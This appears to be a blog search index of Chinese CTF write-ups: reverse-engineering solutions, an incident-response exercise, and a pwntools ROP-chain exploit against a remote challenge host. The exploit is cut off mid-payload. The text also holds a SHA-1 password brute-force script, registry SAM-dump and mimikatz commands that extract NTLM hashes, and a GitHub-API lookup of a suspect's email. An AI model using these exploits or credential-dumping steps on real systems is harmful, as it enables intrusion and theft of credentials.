<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>[2019红帽杯]easyRE</title>
    <url>/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/</url>
    <content><![CDATA[<ol>
<li><p>先用IDA打开，无main函数，查字符串<br><img src="/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/1.png" alt="1"></p>
</li>
<li><p>先进入个关键词<br>  <img src="/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/2.png" alt="2"></p>
</li>
</ol>
<p>​      解码：</p>
<p><img src="/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/3.png" alt="3"></p>
<p><img src="/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/4.png" alt="4"></p>
<p>发现是干扰项</p>
<ol start="3">
<li><p>进入第二个关键词所在函数</p>
<p><img src="/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/5.png" alt="5"></p>
</li>
</ol>
<p>​       在汇编界面，找到v12<br>​      <img src="/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/6.png" alt="6"></p>
<p>​     逆向运算得到v15</p>
<pre><code> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> v15[]=&#123;<span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x6F</span>,</span><br><span class="line"><span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x6C</span>,</span><br><span class="line"><span class="number">0x3E</span>,</span><br><span class="line"><span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0x62</span>,</span><br><span class="line"><span class="number">0x28</span>,</span><br><span class="line"><span class="number">0x6F</span>,</span><br><span class="line"><span class="number">0x63</span>,</span><br><span class="line"><span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x7F</span>,</span><br><span class="line"><span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x2E</span>,</span><br><span class="line"><span class="number">0x69</span>,</span><br><span class="line"><span class="number">0x7F</span>,</span><br><span class="line"><span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x60</span>,</span><br><span class="line"><span class="number">0x33</span>,</span><br><span class="line"><span class="number">0x77</span>,</span><br><span class="line"><span class="number">0x7D</span>,</span><br><span class="line"><span class="number">0x77</span>,</span><br><span class="line"><span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x6B</span>,</span><br><span class="line"><span class="number">0x39</span>,</span><br><span class="line"><span class="number">0x7B</span>,</span><br><span class="line"><span class="number">0x69</span>,</span><br><span class="line"><span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x3D</span>,</span><br><span class="line"><span class="number">0x7E</span>,</span><br><span class="line"><span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x4C</span>,</span><br><span class="line"><span class="number">0x40</span>,</span><br><span class="line"><span class="number">0x45</span>,</span><br><span class="line"><span class="number">0x43</span>&#125;;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">char</span> result[<span class="built_in">strlen</span>(v15)];</span><br><span class="line">	<span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(v15); ++i )&#123;</span><br><span class="line">		 result[i] =v15[i] ^ i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,result);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
</code></pre>
<p>得到</p>
<p><img src="/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/7.png" alt="7"></p>
<p>到这里后没什么线索了，就在能再去找了<br>发现可疑字符串</p>
<p><img src="/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/8.png" alt="8"></p>
<p>进入函数</p>
<p><img src="/2025/02/14/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/9.png" alt="9"></p>
<p>根据前面的提示，前4个字符是flag，猜测这个函数大概的意思就是v1分别和byte_6CC0A0和byte_6CC0A3的前四个字符异或是flag,就进行第二个循环，先可以编写解题脚本了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char byte_6CC0A0[]=&#123;</span><br><span class="line">  0x40,0x35,0x20,0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, </span><br><span class="line">  0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, </span><br><span class="line">  0x45, 0x5B</span><br><span class="line">&#125;;</span><br><span class="line">	int i,j;</span><br><span class="line">	char flag[] = &quot;flag&quot;;</span><br><span class="line">	char flag2[4];</span><br><span class="line">	char result[strlen(byte_6CC0A0)];</span><br><span class="line">	for(i = 0;i &lt; 4; i++)&#123;</span><br><span class="line">		flag2[i] = flag[i] ^ byte_6CC0A0[i];</span><br><span class="line">	&#125;</span><br><span class="line">	for ( i = 0; i &lt; strlen(byte_6CC0A0); ++i )&#123;</span><br><span class="line">		j = i%4;</span><br><span class="line">		 result[i] = flag2[j] ^ byte_6CC0A0[i];</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;,result);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Act1ve_Defen5e_Test&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>2025 Parloo杯</title>
    <url>/2025/07/30/2025-Parloo%E6%9D%AF/</url>
    <content><![CDATA[<p>这里先放一个虚拟机的配置，将附件解压后点击vmx文件就可以打开虚拟机了。</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/1.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/2.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/3.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/4.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/5.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/7.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/8.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/9.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/10.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/11.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/12.png" alt="1"></p>
<p>畸行的爱解压密码：<br>Parloo&amp;zgsfsys&amp;onefox&amp;solar**juyt</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/13.png" alt="1"></p>
<p>这里有四个虚拟机win7,win10,mysql,wedserver</p>
<h2 id="畸形的爱-复现"><a href="#畸形的爱-复现" class="headerlink" title="畸形的爱(复现)"></a>畸形的爱(复现)</h2><h3 id="攻击者ip地址1"><a href="#攻击者ip地址1" class="headerlink" title="攻击者ip地址1"></a>攻击者ip地址1</h3><p>先看webserver</p>
<p>先history命令，查看可以发现开启了docker环境，我们在升级到root，再history，和它一样开启docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start ec87eb8a81c7 6801404902b1 192686b818fc</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/14.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/15.png" alt="1"></p>
<p>​               列出所有TCP协议的网络连接及其状态 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anplt</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/16.png" alt="1"></p>
<p>看到nginx,去看看他的日志</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/17.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/18.png" alt="1"></p>
<p>看到shell.php可以确定ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.31.240</span><br></pre></td></tr></table></figure>



<h3 id="攻击者ip地址2"><a href="#攻击者ip地址2" class="headerlink" title="攻击者ip地址2"></a>攻击者ip地址2</h3><p>这题据说有bug，都是跟着其他师傅复现的。</p>
<p>先看docker开始的环境，再进入有wendata的环境，有clean.sh很明显shell脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker  exec -it ec87eb8a81c7(ip) /bin/sh</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/19.png" alt="1"></p>
<p>nc的反连地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.31.11</span><br></pre></td></tr></table></figure>



<h3 id="暴力破解开始时间"><a href="#暴力破解开始时间" class="headerlink" title="暴力破解开始时间"></a>暴力破解开始时间</h3><p>先根据暴力破解一般是有登录，ssh等才能被破解</p>
<p>根据phpmyadmin最具破解力</p>
<p>Docker容器会把写到容器标准输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs phpmyadmin</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/20.png" alt="1"></p>
<p>post ;时间密集；登录界面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2025:03:05:58</span><br></pre></td></tr></table></figure>



<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>这个flag在windows上</p>
<p>大佬们有everything一搜索就搜索出来了，我是到任务计划程序去看的。</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/21.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">palu&#123;pc3_zgsfqwerlkssaw&#125;</span><br></pre></td></tr></table></figure>



<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>再flag所在的地方的文件里看到C:\Program Files (x86)\Microsoft\a.bat</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/22.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">palu&#123;nizhidaowoyouduoainima&#125;</span><br></pre></td></tr></table></figure>



<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里要用<a href="https://blog.csdn.net/m0_70898474/article/details/136275566">Navicat</a></p>
<p>我的navicat连不上mysql数据库，这题先放这。</p>
<h3 id="提交钓鱼文件的md5"><a href="#提交钓鱼文件的md5" class="headerlink" title="提交钓鱼文件的md5"></a>提交钓鱼文件的md5</h3><p>钓鱼一般都是聊天</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/24.png" alt="1"></p>
<p>在回收站里去找</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/23.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -hashfile &quot;C:\Users\Administrator\Desktop\简历.zip&quot; MD5</span><br></pre></td></tr></table></figure>

<p>效验md5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a69df5bdfef664d0a22b7d8b62c44718</span><br></pre></td></tr></table></figure>



<h3 id="提交攻击者留下的webshell-1的密码"><a href="#提交攻击者留下的webshell-1的密码" class="headerlink" title="提交攻击者留下的webshell-1的密码"></a>提交攻击者留下的webshell-1的密码</h3><p>在找ip的时候会留意到shell.php下面有个a.php</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/25.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00232</span><br></pre></td></tr></table></figure>



<h3 id="提交攻击者留下的webshell-2的密码"><a href="#提交攻击者留下的webshell-2的密码" class="headerlink" title="提交攻击者留下的webshell-2的密码"></a>提交攻击者留下的webshell-2的密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -name &quot;*.php&quot;</span><br></pre></td></tr></table></figure>

<p>全局查找一下php文件太多了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -name &quot;shell.php&quot;</span><br></pre></td></tr></table></figure>

<p>猜一下shell.php</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/26.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hack</span><br></pre></td></tr></table></figure>



<h3 id="提交攻击者开放端口"><a href="#提交攻击者开放端口" class="headerlink" title="提交攻击者开放端口"></a>提交攻击者开放端口</h3><p>这题据说环境有问题，也放这里</p>
<h3 id="提交攻击者留下的隐藏账户和密码"><a href="#提交攻击者留下的隐藏账户和密码" class="headerlink" title="提交攻击者留下的隐藏账户和密码"></a>提交攻击者留下的隐藏账户和密码</h3><p>先用D盾查</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/27.png" alt="1"></p>
<p>在用mimikatz跑出hash</p>
<p>先cmd用管理员身份运行，然后输入下面两行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd C:\Users\Administrator\Desktop\mimikatz_trunk\x64   进入exe所在目录</span><br><span class="line">reg save hklm\sam sam.save</span><br><span class="line">reg save hklm\system system.save</span><br><span class="line">C:\Users\Administrator\Desktop\mimikatz_trunk\x64\mimikatz.exe 运行exe</span><br><span class="line">privilege::debug</span><br><span class="line">lsadump::sam /sam:sam.save /system:system.save</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RID  : 000003ea (1002)</span><br><span class="line">User : system$</span><br><span class="line">  Hash NTLM: dbae99beb48fd9132e1cf77f4c746979</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cmd5.com/default.aspx">在线网站破解md5</a></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/28.png" alt="1"></p>
<p>要付费，解出来是wmx_love</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmx_love</span><br></pre></td></tr></table></figure>

<h3 id="攻击者的邮箱-溯源"><a href="#攻击者的邮箱-溯源" class="headerlink" title="攻击者的邮箱(溯源)"></a>攻击者的邮箱(溯源)</h3><h3 id="flag4-溯源"><a href="#flag4-溯源" class="headerlink" title="flag4(溯源)"></a>flag4(溯源)</h3><p>先分析简历exe</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/29.png" alt="1"></p>
<p>得到黑客的名字n0k4u</p>
<p>去github上找</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/30.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/31.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/32.png" alt="1"></p>
<p>3834239649是个QQ号</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/33.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/34.png" alt="1"></p>
<p>我们找到了github的地址，知道了github就可以泄露出邮箱地址</p>
<p>直接搜通过Github用户名溯源个人邮箱可以找到参考文献<a href="https://blog.csdn.net/fishfishfishman/article/details/141320003">链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://api.github.com/users/&lt;name&gt;/events/public 把name换成</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/35.png" alt="1"></p>
<p>这里没出来，感觉是不是删了还是怎么搞的别的师傅都出来了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n0k4u@outlook.com</span><br></pre></td></tr></table></figure>

<p>到这里畸形的爱就复现完了</p>
]]></content>
      <categories>
        <category>应急响应</category>
        <category>第二届parloo杯 write up</category>
      </categories>
  </entry>
  <entry>
    <title>[ACTF新生赛2020]usualCrypt</title>
    <url>/2025/02/16/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/</url>
    <content><![CDATA[<ol>
<li>用IDA打开<br><img src="/2025/02/16/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/1.png" alt="1"></li>
</ol>
<p><img src="/2025/02/16/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/2.png" alt="2"></p>
<p>​    <img src="/2025/02/16/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/3.png" alt="3"></p>
<ol start="2">
<li><p>现将混淆复原</p>
<p><img src="/2025/02/16/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/4.png" alt="4"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> byte_40E0AA[] = <span class="string">&quot;KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line">	<span class="type">char</span> byte_40E0A0[] = <span class="string">&quot;ABCDEFGHIJ&quot;</span>;</span><br><span class="line">	<span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> v1; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( result = <span class="number">6</span>; result &lt; <span class="number">15</span>; ++result )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = byte_40E0AA[result];</span><br><span class="line">    byte_40E0AA[result] = byte_40E0A0[result];</span><br><span class="line">    byte_40E0A0[result] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,byte_40E0A0);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, byte_40E0AA);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>发现一个问题，byte_40E0A0[]只有10到不来15，所以要改进一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> byte_40E0AA[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line">	<span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> v1; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( result = <span class="number">6</span>; result &lt; <span class="number">15</span>; ++result )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = byte_40E0AA[result];</span><br><span class="line">    byte_40E0AA[result] = byte_40E0AA[result+<span class="number">10</span>];</span><br><span class="line">    byte_40E0AA[result+<span class="number">10</span>] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, byte_40E0AA);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br></pre></td></tr></table></figure>
</li>
<li><p>将大小写复原</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> v2[] = <span class="string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span> ;</span><br><span class="line">	<span class="type">int</span> i,j;</span><br><span class="line">	<span class="type">char</span> v1[<span class="built_in">strlen</span>(v2)];</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="built_in">strlen</span>(v2); i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> ( (v2[i] &lt; <span class="number">97</span> || v2[i] &gt; <span class="number">122</span>) &amp;&amp; (v2[i] &lt; <span class="number">65</span> || v2[i] &gt; <span class="number">90</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        </span><br><span class="line">          v1[i] = v2[i];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(v2[i] &lt; <span class="number">97</span> || v2[i] &gt; <span class="number">122</span>)&#123;</span><br><span class="line">      	v1[i] = v2[i] + <span class="number">32</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">            v1[i] = v2[i] - <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v1);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>最后用<a href="http://web.chacuo.net/netbasex">在线网站</a>解码</p>
<p><img src="/2025/02/16/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt/5.png" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;bAse64_h2s_a_Surprise&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF CrackRTF</title>
    <url>/2025/02/12/BUUCTF-CrackRTF/</url>
    <content><![CDATA[<ol>
<li><p>先用IDA打开分析一下<br><img src="/2025/02/12/BUUCTF-CrackRTF/1.png" alt="1"></p>
</li>
<li><p>哈希值的加密方式可以根据这个<a href="https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id">表</a></p>
</li>
<li><p>先用脚本爆破password1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标哈希值</span></span><br><span class="line">target_hash = <span class="string">&#x27;6E32D0943418C2C33385BC35A1470250DD8923A9&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定字符串部分</span></span><br><span class="line">fixed_str = <span class="string">&#x27;@DBApp&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数字范围</span></span><br><span class="line">start_num = <span class="number">99999</span></span><br><span class="line">end_num = <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴力搜索</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(start_num, end_num):</span><br><span class="line">    <span class="comment"># 将数字转换为字符串并与固定字符串拼接，然后计算其SHA-256哈希值</span></span><br><span class="line">    test_str = <span class="built_in">str</span>(num) + fixed_str</span><br><span class="line">    hash_object = hashlib.sha1(test_str.encode())</span><br><span class="line">    <span class="keyword">if</span> hash_object.hexdigest().upper() == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到匹配的字符串: <span class="subst">&#123;test_str&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到匹配的字符串&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到匹配的字符串: 123321@DBApp</span><br></pre></td></tr></table></figure>


</li>
<li><p>因为第二个恰好是MD5加密有<a href="https://www.btool.cn/md5dsc">在线网站</a></p>
<p><img src="/2025/02/12/BUUCTF-CrackRTF/2.png" alt="2"></p>
</li>
<li><p>再运行exe<br><img src="/2025/02/12/BUUCTF-CrackRTF/3.png" alt="3"></p>
</li>
</ol>
<p>​      由此可知会产生一个dbapp.rtf文件，打开</p>
<p>​         <img src="/2025/02/12/BUUCTF-CrackRTF/4.png" alt="4"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag&#123;N0_M0re_Free_Bugs&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF_inndy_rop(rop链)</title>
    <url>/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/</url>
    <content><![CDATA[<h2 id="IDA打开"><a href="#IDA打开" class="headerlink" title="IDA打开"></a>IDA打开</h2><p><img src="/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/1.png" alt="1"></p>
<ol>
<li><p>没有任何可以利用的东西（如system,&#x2F;bin&#x2F;sh,put,write等）</p>
</li>
<li><p>就只有一个get函数，存在栈溢出。</p>
</li>
<li><p>所以我们只能自己来构造rop链<br>利用ROPgadget可以直接构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>

<p><img src="/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/2.png" alt="2"></p>
</li>
<li><p>写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26568</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload</span>():</span><br><span class="line">    <span class="comment"># 将初始字符串转换为 bytes</span></span><br><span class="line">    p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span> + <span class="number">4</span>)</span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span>  <span class="comment"># 字符串需要转换为 bytes</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>)  <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span>  <span class="comment"># 字符串需要转换为 bytes</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>)  <span class="comment"># pop ebx ; ret</span></span><br><span 